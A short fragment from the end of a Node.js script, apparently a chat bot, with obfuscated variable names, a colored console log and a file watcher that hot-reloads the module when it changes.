    }, {
      'quoted': _0x2decff
    });
    console.log("[1;31m" + _0x59b800 + "[0m");
  }
};
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});